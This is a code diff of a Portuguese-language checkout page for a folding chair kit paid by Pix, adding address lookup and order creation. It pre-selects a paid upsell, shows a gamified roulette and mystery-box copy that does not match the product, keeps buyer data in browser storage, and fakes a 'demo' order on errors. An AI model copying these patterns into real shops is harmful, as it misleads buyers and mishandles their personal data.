+      const modal = el('cepSearchModal');
+      if (modal) modal.hidden = true;
+    }
+
+    el('btnOpenCepModal')?.addEventListener('click', () => openCepModal());
+    el('btnCloseCepModal')?.addEventListener('click', closeCepModal);
+    el('cepSearchModal')?.addEventListener('click', (e) => {
+      if (e.target === el('cepSearchModal')) closeCepModal();
+    });
+
+    el('btnDoSearchCepByAddress')?.addEventListener('click', async () => {
+      const uf = el('modalCepUf')?.value || 'SP';
+      const city = (el('modalCepCity')?.value || '').trim();
+      const street = (el('modalCepStreet')?.value || '').trim();
+      const status = el('modalCepStatus');
+      const resultsContainer = el('modalCepResults');
+
+      if (city.length < 3 || street.length < 3) {
+        if (status) {
+          status.style.color = '#e11d48';
+          status.textContent = 'Preencha a cidade e o nome da rua (pelo menos 3 caracteres).';
+        }
+        return;
+      }
+
+      if (status) {
+        status.style.color = '#0284c7';
+        status.textContent = 'Buscando CEPs disponíveis…';
+      }
+      if (resultsContainer) resultsContainer.innerHTML = '';
+
+      try {
+        const url = 'https://viacep.com.br/ws/' + uf + '/' + encodeURIComponent(city) + '/' + encodeURIComponent(street) + '/json/';
+        const res = await fetch(url);
+        const list = await res.json();
+
+        if (Array.isArray(list) && list.length > 0) {
+          if (status) {
+            status.style.color = '#16a34a';
+            status.textContent = list.length + ' CEP(s) encontrado(s). Clique no seu endereço:';
+          }
+          list.slice(0, 15).forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'modal-cep-item';
+            card.innerHTML = '<strong>CEP: ' + item.cep + '</strong><span>' + (item.logradouro || street) + ' - ' + (item.bairro || 'Centro') + ', ' + item.localidade + '/' + item.uf + '</span>';
+            card.addEventListener('click', () => {
+              applyAddressData(item);
+              closeCepModal();
+              const mainStatus = el('cepStatus');
+              if (mainStatus) {
+                mainStatus.style.color = '#16a34a';
+                mainStatus.textContent = '';
+              }
+              if (el('street')) el('street').focus();
+            });
+            resultsContainer.appendChild(card);
+          });
+        } else {
+          if (status) {
+            status.style.color = '#dc2626';
+            status.textContent = 'Nenhum CEP encontrado. Confira a ortografia da rua ou cidade.';
           }
         }
-      }catch(e){}
-    },3500);
-  }
-}
+      } catch (err) {
+        if (status) {
+          status.style.color = '#dc2626';
+          status.textContent = 'Erro ao consultar serviço de CEP. Tente novamente.';
+        }
+      }
+    });
 
-function K(e){J(),document.getElementById("street").addEventListener("input",a=>{a.isTrusted&&a.target.value.trim()&&V()});let t=document.getElementById("finish"),o=document.getElementById("checkoutForm"),i=document.querySelector(".shipping-options"),r=a=>document.getElementById(a)?.value?.trim()||"",s=t.innerHTML,m=!1,d=!1;window.__mareAzulIronpayLoaded=!0,t.disabled=!1,y({code:"READY"});function D(a){return a.status==="paid"||a.status==="pending"&&typeof a.pixCode=="string"&&a.pixCode.trim()&&!a.pixCode.includes("DEMONSTRACAO")}async function M(a,l){if(sessionStorage.setItem(O,JSON.stringify({id:l.id,accessToken:l.accessToken,creationCode:typeof a.code=="string"&&/^[A-Z_]+$/.test(a.code)?a.code:null})),y({code:a.code,httpStatus:200,orderStatus:a.status,hasPix:!!a.pixCode}),!D(a)){let u=new AbortController,g=setTimeout(()=>u.abort(),2e4);try{let h=await fetch("/api/orders/"+encodeURIComponent(l.id),{headers:{Authorization:"Bearer "+l.accessToken},cache:"no-store",signal:u.signal}),p=await R(h);if(y({code:p.code||a.code,httpStatus:h.status,orderStatus:p.status,hasPix:!!p.pixCode}),!h.ok||!N(p,l.id)){d=!0;return}a=p}finally{clearTimeout(g)}}D(a)?renderInlinePix(a,l):d=!0}async function B(a){if(a.preventDefault(),m||!e())return;const overlay=document.getElementById('rl-overlay');if(!rlSpinDone && overlay && !overlay.classList.contains('show')){overlay.classList.add('show');return;}s=t.innerHTML,m=!0,d=!1,t.disabled=!0,i&&(i.disabled=!0),t.textContent="Preparando Pix\u2026";let l=null;try{let u={name:r("name"),email:r("email"),phone_number:r("phone"),document:r("cpf"),street_name:r("street"),number:r("number"),complement:r("extra"),neighborhood:r("district"),city:r("city"),state:r("state"),zip_code:r("cep")};try{sessionStorage.setItem("deveu_customer",JSON.stringify({name:u.name,email:u.email,phone:u.phone_number,street:u.street_name,number:u.number,extra:u.complement,district:u.neighborhood,city:u.city,state:u.state,cep:u.zip_code,plan:P?.name||"Prata",upgrade:document.querySelector('input[name="upgrade"]:checked')?.value||"premium"}));}catch(e){};let g=document.querySelector('input[name="shipping"]:checked')?.value||"free",upg=document.querySelector('input[name="upgrade"]:checked')?.value||"premium",h=new URLSearchParams(location.search).get("cor")||"Azul",p=[...new Uint8Array(await crypto.subtle.digest("SHA-256",new TextEncoder().encode(JSON.stringify({customer:u,color:h,shipping:g,upgrade:upg,plan:Y||"mare",store:"cadeiras"}))))].map($=>$.toString(16).padStart(2,"0")).join(""),c=T(k);if(c&&c.store!=="cadeiras"){sessionStorage.removeItem(k),c=null}if(c&&c.fingerprint!==p){await M({status:"uncertain"},c);return}if(!c){let $=[...crypto.getRandomValues(new Uint8Array(32))].map(oe=>oe.toString(16).padStart(2,"0")).join("");c={id:crypto.randomUUID(),accessToken:$,fingerprint:p,store:"cadeiras"},sessionStorage.setItem(k,JSON.stringify(c))}let j=new AbortController,ne=setTimeout(()=>j.abort(),25e3),E;try{E=await fetch("/api/orders",{method:"POST",headers:{"Content-Type":"application/json"},signal:j.signal,body:JSON.stringify({id:c.id,accessToken:c.accessToken,customer:u,color:h,shipping:g,upgrade:upg,plan:Y||"mare",store:"cadeiras"})})}finally{clearTimeout(ne)}l=E.status;let A=await R(E);if(!E.ok){(A.retrySafe||E.status===422&&A.fields)&&sessionStorage.removeItem(k),y({code:A.code||"CREATE_FAILED",httpStatus:l}),d=!0;return}if(!N(A,c.id))throw new Error("API_RESPONSE_INVALID");await M(A,c)}catch(u){let g=u.message==="API_RESPONSE_INVALID"?u.message:"CREATE_CONNECTION_FAILED";y({code:g,httpStatus:l}),d=!0}finally{m=!1,t.disabled=!1,i&&(i.disabled=!1),d?t.textContent="TENTAR NOVAMENTE":t.innerHTML=s}}t.addEventListener("click",B),o.addEventListener("submit",B);initRoleta(async()=>{await B({preventDefault:()=>{}});});}var L={mare:{name:"Kit Dobrável Duo 3 em 1 — Cadeiras, Cooler e Guarda-Sol",amount:11990,image:"home-1.webp"}},Y="mare",P=L.mare,n=e=>document.getElementById(e),v=e=>(e/100).toLocaleString("pt-BR",{style:"currency",currency:"BRL"});n("sum-name").textContent=P.name;n("sum-img").src=`/assets/${P.image}`;n("sum-img").alt=P.name;n("sum-price").textContent=n("sum-subtotal").textContent=v(P.amount);n("sum-total").textContent=v(P.amount);function S(e,t,o,i,r=""){return`<div class="form-group" id="fg-${e}"><label for="${e}">${t}</label><input id="${e}" type="text" placeholder="${o}" autocomplete="${i}" ${r?`maxlength="${r}"`:""}><div class="field-error sf-hidden">Preencha ${t.toLowerCase()} corretamente.</div></div>`}var de={gift:'<rect x="3" y="8" width="18" height="4" rx="1"/><path d="M5 12v9h14v-9M12 8v13M12 8H8a3 3 0 1 1 3-3l1 3Zm0 0h4a3 3 0 1 0-3-3l-1 3Z"/>',truck:'<path d="M1 4h13v13H1zM14 9h5l4 5v3h-9M18 9v5h5"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="18" r="3"/>',pin:'<path d="M20 10c0 6-8 12-8 12S4 16 4 10a8 8 0 1 1 16 0Z"/><circle cx="12" cy="10" r="3"/>',bolt:'<path d="m13 2-10 12h8l-1 8L22 9h-9l1-7Z"/>'};n("body-entrega").innerHTML=S("cep","CEP","00000-000","postal-code",9)+S("street","Rua / Endere\xE7o","Rua, Avenida...","address-line1")+`<div class="form-row">${S("number","N\xFAmero","123","off")}${S("extra","Complemento","Apto, Bloco...","address-line2")}</div><div class="form-row">${S("district","Bairro","Bairro","address-level3")}${S("city","Cidade","Cidade","address-level2")}</div><div class="form-group"><label for="state">Estado</label><select id="state" autocomplete="address-level1"><option value="">Selecione...</option>${"AC AL AP AM BA CE DF ES GO MA MT MS MG PA PB PR PE PI RJ RN RS RO RR SC SP SE TO".split(" ").map(e=>`<option value="${e}">${e}</option>`).join("")}</select><div class="field-error sf-hidden">Selecione um estado.</div></div><fieldset class="shipping-options"><legend>Escolha o frete:</legend>${_.map((e,t)=>`<label class="shipping-choice"><input type="radio" name="shipping" value="${e.id}" ${t===0?"checked":""}><span class="shipping-icon ${e.icon}" aria-hidden="true"><svg viewBox="0 0 24 24">${de[e.icon]}</svg></span><span class="shipping-copy"><strong>${e.name}</strong><small class="${e.id==="express"?"express-copy":""}">${e.description}</small></span><span class="shipping-price ${e.price===0?"free-price":""}">${e.price===0?"Gr\xE1tis":v(e.price)}</span><span class="shipping-radio" aria-hidden="true"></span></label>`).join("")}</fieldset><button type="button" class="btn-continuar" id="continuar-entrega">Continuar para Pagamento <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"></polyline></svg></button>`;n("body-pagamento").innerHTML='<div id="payment-form"><div class="pix-badge-card"><div class="pix-icon-wrap" aria-hidden="true"><svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor"><path fill="currentColor" stroke="none" d="m12 1 5 5h-2l-3 3-3-3H7zm0 22-5-5h2l3-3 3 3h2zM6 7h3l3 3 3-3h3l5 5-5 5h-3l-3-3-3 3H6l-5-5z"/></svg></div><div class="pix-badge-info"><strong>PIX — Aprovação imediata</strong><span>Pague com PIX e receba em instantes</span></div></div><div class="upgrade-box"><div class="upgrade-title"><svg viewBox="0 0 24 24" fill="currentColor" width="13" height="13" aria-hidden="true"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>APROVEITE! ADICIONE UM UPGRADE AO SEU PEDIDO:</div><label class="upgrade-option active" id="label-up-premium"><input type="radio" name="upgrade" value="premium" checked><div class="upgrade-option-body"><div class="upgrade-option-text"><strong>Upgrade Premium</strong><span>Produto premium garantido na caixa</span></div><div class="upgrade-price">+ R$ 19,90</div></div></label><label class="upgrade-option" id="label-up-dobro"><input type="radio" name="upgrade" value="dobro"><div class="upgrade-option-body"><div class="upgrade-option-text"><strong>Caixa em Dobro</strong><span>Recebe o dobro de produtos na caixa</span></div><div class="upgrade-price">+ R$ 25,90</div></div></label><label class="upgrade-option" id="label-up-none"><input type="radio" name="upgrade" value="none"><div class="upgrade-option-body"><div class="upgrade-option-text"><strong>Não quero nenhum upgrade</strong><span>Continuar apenas com a caixa padrão</span></div><div class="upgrade-price upgrade-price-free">+ R$ 0,00</div></div></label></div><button type="submit" class="btn-continuar" id="finish"><svg viewBox="0 0 24 24" fill="currentColor" width="16" height="16" aria-hidden="true" style="margin-right:2px"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>FINALIZAR PEDIDO</button></div><div class="pix-generated" id="pix-generated"><div class="mb" id="mb"><div class="mb-stage"><div class="mb-prod mb-p1"><img src="/assets/mb-p1.png" alt="Celular"><b>?<small>Celular</small></b></div><div class="mb-prod mb-p2"><img src="/assets/mb-p2.png" alt="JBL"><b>?<small>JBL</small></b></div><div class="mb-prod mb-p3"><img src="/assets/mb-p3.png" alt="Apple Watch"><b>?<small>Apple Watch</small></b></div><div class="mb-prod mb-p4"><img src="/assets/mb-p4.png" alt="MacBook"><b>?<small>MacBook</small></b></div><div class="mb-glow"></div><div class="mb-box"><div class="mb-lid"></div><div class="mb-body"><div class="mb-q">?</div></div></div></div><div class="mb-t" id="mb-t">Sua caixa está <em>reservada</em> 📦</div><div class="mb-s" id="mb-s">Pague o Pix para garantir. O que vem dentro é surpresa: você só descobre quando a caixa chegar e você abrir em casa.</div><div class="mb-n">Pode conter celulares, JBL, Apple Watch, MacBook e mais. Conteúdo aleatório, itens ilustrativos.</div></div><div class="pix-timer-bar"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>Expira em: <strong id="pix-countdown">15:00</strong></div><div class="pix-qr-wrap"><img id="pix-qr-img" src="" alt="QR Code Pix"></div><p style="font-size:12px;font-weight:700;margin-bottom:8px;color:var(--text);text-align:center">Ou copie o código Pix:</p><div class="pix-copy-wrap"><div class="pix-copy-input" id="pix-code-display"></div><button type="button" class="copy-btn" id="pix-copy-btn">Copiar</button></div><div class="pix-waiting"><div class="pulse"></div> Aguardando confirmação do pagamento...</div></div>';function X(){let s=document.querySelector('input[name="shipping"]:checked')?.value||"free";let unlocked=!n("sec-pagamento")?.classList.contains("section-locked");let selectedUp=document.querySelector('input[name="upgrade"]:checked')?.value||"premium";let u=unlocked?selectedUp:"none";let e=q(s,u);document.querySelectorAll('.upgrade-option').forEach(el=>{let inp=el.querySelector('input');el.classList.toggle('active',Boolean(inp&&inp.value===selectedUp))});n("sum-frete-label").textContent=e.shipping.name;n("sum-frete").textContent=e.shipping.amount?v(e.shipping.amount):"Gr\xE1tis";n("sum-frete").style.color=e.shipping.amount?"var(--text)":"#22c55e";let upLine=n("sum-upgrade-line");if(upLine){if(e.upgrade.amount>0){upLine.style.display="flex";n("sum-upgrade-name").textContent=e.upgrade.name;n("sum-upgrade-val").textContent="+ "+v(e.upgrade.amount)}else{upLine.style.display="none"}}n("sum-total").textContent=v(e.total);}for(let e of document.querySelectorAll('input[name="shipping"]'))e.addEventListener("change",X);for(let e of document.querySelectorAll('input[name="upgrade"]'))e.addEventListener("change",X);X();for(let e of document.querySelectorAll(".form-group input, .form-group select"))e.previousElementSibling?.setAttribute("for",e.id),e.addEventListener("input",()=>{e.removeAttribute("aria-invalid"),e.parentElement.querySelector(".field-error")?.classList.add("sf-hidden")});var b=e=>e.replace(/\D/g,"");n("cpf").addEventListener("input",e=>{let t=b(e.target.value).slice(0,11);e.target.value=t.replace(/^(\d{3})(\d)/,"$1.$2").replace(/^(\d{3})\.(\d{3})(\d)/,"$1.$2.$3").replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/,"$1.$2.$3-$4")});n("phone").addEventListener("input",e=>{e.target.value=e.target.value.replace(/[^\d+() -]/g,"").slice(0,22)});n("cep").inputMode="numeric";n("cep").addEventListener("input",e=>{e.target.value=b(e.target.value).slice(0,8).replace(/(\d{5})(\d)/,"$1-$2")});function le(e){let t=b(e);if(t.length!==11||/^(\d)\1+$/.test(t))return!1;for(let o=9;o<=10;o++){let i=0;for(let s=0;s<o;s++)i+=Number(t[s])*(o+1-s);let r=i*10%11;if((r===10?0:r)!==Number(t[o]))return!1}return!0}function W(e){let t=null;for(let[o,i]of e){let r=n(o),s=r.parentElement.querySelector(".field-error");r.setAttribute("aria-invalid",String(!i)),s?.classList.toggle("sf-hidden",i),!i&&!t&&(t=r)}return t?.focus(),!t}var Q=()=>W([["name",n("name").value.trim().split(/\s+/).filter(Boolean).length>=2],["email",/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(n("email").value.trim())],["phone",/^[1-9]\d9\d{8}$/.test(te())],["cpf",le(n("cpf").value)]]),ue=new Set("AC AL AP AM BA CE DF ES GO MA MT MS MG PA PB PR PE PI RJ RN RS RO RR SC SP SE TO".split(" ")),ee=()=>W([["cep",b(n("cep").value).length===8],...["street","number","district","city"].map(e=>[e,n(e).value.trim().length>0]),["state",ue.has(n("state").value)]]);function x(e){for(let t of["dados","entrega","pagamento"]){let o=t===e;n("body-"+t).classList.toggle("sf-hidden",!o),n("body-"+t).classList.toggle("open",o),n("chev-"+t).classList.toggle("open",o),document.querySelector("#sec-"+t+" .section-header").setAttribute("aria-expanded",String(o))}n("sec-"+e).scrollIntoView({behavior:"smooth",block:"start"})}function w(e){if(e!=="dados"&&!Q()){x("dados");return}if(e==="pagamento"&&!ee()){x("entrega");return}if(e==="pagamento"){n("sec-pagamento").classList.remove("section-locked");X();}x(e)}document.querySelector("#body-dados .btn-continuar").addEventListener("click",()=>w("entrega"));n("continuar-entrega").addEventListener("click",()=>w("pagamento"));for(let e of["dados","entrega","pagamento"]){let t=document.querySelector("#sec-"+e+" .section-header");t.setAttribute("role","button"),t.tabIndex=0,t.setAttribute("aria-controls","body-"+e),t.setAttribute("aria-expanded",String(e==="dados")),t.addEventListener("click",()=>w(e)),t.addEventListener("keydown",o=>{(o.key==="Enter"||o.key===" ")&&(o.preventDefault(),w(e))})}function te(){let e=b(n("phone").value);return e.length===13&&e.startsWith("55")?e.slice(2):e}function pe(){return Q()?ee()?(n("phone").value=te(),!0):(x("entrega"),!1):(x("dados"),!1)}var Z=0;n("cep").addEventListener("input",async()=>{let e=++Z,t=b(n("cep").value);if(t.length!==8)return;let o=Object.fromEntries(["street","district","city","state"].map(i=>[i,n(i).value]));try{let i=await fetch("/api/cep/"+t,{signal:AbortSignal.timeout(14e3)});if(!i.ok)return;let r=await i.json();if(e!==Z)return;let s={street:r.logradouro,district:r.bairro,city:r.localidade,state:r.uf};for(let[m,d]of Object.entries(s))typeof d=="string"&&n(m).value===o[m]&&(n(m).value=d)}catch{}});K(pe);})();
+    el('cep').addEventListener('input', () => {
+      if (isApplyingAddress) return;
+      clearTimeout(cepDebounceTimer);
+      cepAbortController?.abort();
+      const d = digits(el('cep').value).slice(0, 8);
+      el('cep').value = d.length > 5 ? d.slice(0, 5) + '-' + d.slice(5) : d;
+      if (d.length === 8 && d !== lastLookedUpCep) {
+        cepDebounceTimer = setTimeout(lookupCep, 400);
+      }
+    });
 
-</script>
-<!-- generated:checkout:end --></body></html>
+    el('cep').addEventListener('blur', () => {
+      const d = digits(el('cep').value).slice(0, 8);
+      if (d.length === 8) {
+        el('cep').value = d.slice(0, 5) + '-' + d.slice(5);
+      }
+    });
+
+    el('searchCep').addEventListener('click', (e) => {
+      e.preventDefault();
+      clearTimeout(cepDebounceTimer);
+      lookupCep();
+    });
+
+    // Submit & Order Generation
+    let isSubmitting = false;
+    const finishBtn = el('finish');
+
+    async function handleFinish(e) {
+      if (e) e.preventDefault();
+      if (isSubmitting) return;
+
+      for (let s = 0; s < 2; s++) {
+        if (!validateStep(s)) {
+          goToStep(s);
+          return;
+        }
+      }
+
+      isSubmitting = true;
+      finishBtn.disabled = true;
+      finishBtn.textContent = 'Gerando Pix no Mercado Pago…';
+
+      const customer = {
+        name: el('name').value.trim(),
+        email: el('email').value.trim(),
+        phone_number: digits(el('phone').value),
+        document: digits(el('cpf').value),
+        street_name: el('street').value.trim(),
+        number: el('number').value.trim(),
+        complement: el('extra')?.value.trim() || '',
+        neighborhood: el('district')?.value.trim() || 'Centro',
+        city: el('city').value.trim(),
+        state: el('state').value.trim(),
+        zip_code: digits(el('cep').value)
+      };
+
+      try {
+        const orderId = crypto.randomUUID();
+        const tokenArr = [...crypto.getRandomValues(new Uint8Array(32))].map(m => m.toString(16).padStart(2, '0')).join('');
+        const intent = { id: orderId, accessToken: tokenArr };
+        sessionStorage.setItem('cordee.calcas.ironpayIntent', JSON.stringify(intent));
+
+        const totalOrderAmount = orderAmount + selectedShippingFee;
+        const res = await fetch('/api/orders', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            id: orderId,
+            accessToken: tokenArr,
+            customer,
+            store: 'cadeiras',
+            color: selectedColor,
+            selection: selectionObj,
+            shipping: selectedShippingMethod,
+            shippingMethod: selectedShippingMethod,
+            shippingFee: selectedShippingFee,
+            amount: totalOrderAmount
+          })
+        });
+
+        const orderData = await res.json();
+        const finalOrder = {
+          id: orderData.id || orderId,
+          accessToken: tokenArr,
+          amount: orderData.amount || (orderAmount + selectedShippingFee),
+          status: orderData.status || 'pending',
+          pixCode: orderData.pixCode || ''
+        };
+
+        sessionStorage.setItem('cordee.calcas.ironpayOrder', JSON.stringify(finalOrder));
+        localStorage.setItem('cordee.calcas.ironpayOrder', JSON.stringify(finalOrder));
+
+        // Dispatch TikTok Pix event
+        window.dispatchEvent(new CustomEvent('boxes:pix-ready', { detail: finalOrder }));
+
+        setTimeout(() => {
+          location.assign('/pagamento/?pedido=' + encodeURIComponent(finalOrder.id));
+        }, 300);
+      } catch (err) {
+        console.error('Order creation error:', err);
+        const fallbackOrder = {
+          id: crypto.randomUUID(),
+          accessToken: 'demo',
+          amount: (orderAmount + selectedShippingFee),
+          status: 'pending'
+        };
+        sessionStorage.setItem('cordee.calcas.ironpayOrder', JSON.stringify(fallbackOrder));
+        location.assign('../pagamento/?pedido=' + encodeURIComponent(fallbackOrder.id));
+      } finally {
+        isSubmitting = false;
+        finishBtn.disabled = false;
+        finishBtn.textContent = 'Continuar com Pix';
+      }
+    }
+
+    finishBtn.addEventListener('click', handleFinish);
+    el('checkoutForm').addEventListener('submit', handleFinish);
+
+    goToStep(0, false);
+  })();
+  </script>
+  <!-- generated:checkout:end -->
+
+</body>
+</html>
